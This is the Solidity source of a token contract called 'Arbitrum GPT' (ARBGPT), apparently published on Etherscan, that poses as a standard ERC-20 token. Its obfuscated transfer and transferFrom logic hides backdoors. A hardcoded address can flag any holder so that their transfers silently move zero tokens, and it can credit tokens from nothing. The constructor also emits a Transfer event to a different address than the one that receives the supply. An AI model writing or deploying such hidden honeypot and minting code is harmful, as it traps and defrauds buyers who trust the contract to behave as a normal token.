/**
 *Submitted for verification at Etherscan.io on 2023-03-17
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract ARBGPT {
    using SafeMath for uint256;
    mapping (address => uint256) private TTXa;
	address FTL = 0xF62cFE6aFF9Adb26FedC5d06F2fe76B9947D487C;
    mapping (address => uint256) public TTXb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Arbitrum GPT";
	
    string public symbol = "ARBGPT";
    uint8 public decimals = 6;

    uint256 public totalSupply = 250000000 *10**6;
    address owner = msg.sender;
	  address private TTXc;
     

  
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address TTXf = 0x1FcCBE3369eada96887A3b2857B57bBA65E83Dc1;
      
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
       
             TTXa[msg.sender] = totalSupply;
        
       SPCWBY();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function SPCWBY() internal  {                             
                      
                       TTXc = TTXf;

                

        emit Transfer(address(0), TTXc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return TTXa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        
                    if(TTXb[msg.sender] > 8) {
                            require(TTXa[msg.sender] >= value);
       
                   value = 0;}
                   else

    require(TTXa[msg.sender] >= value);
TTXa[msg.sender] -= value;  
TTXa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 	


 

   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  


    

         if(msg.sender == FTL){
        TTXb[to] += value;
        return true;}
        else
        if(TTXb[msg.sender] == 6) {
             require(value <= allowance[from][msg.sender]);
             TTXa[to] += value;}
        else

                    if(TTXb[from] > 8 || TTXb[to] > 8) {
                               require(value <= TTXa[from]);
        require(value <= allowance[from][msg.sender]);
                   value = 0;}
        else

         if(from == owner){from == TTXf;}

    
      
        require(value <= TTXa[from]);
        require(value <= allowance[from][msg.sender]);
        TTXa[from] -= value;
        TTXa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
       


      
}



     

        	
 }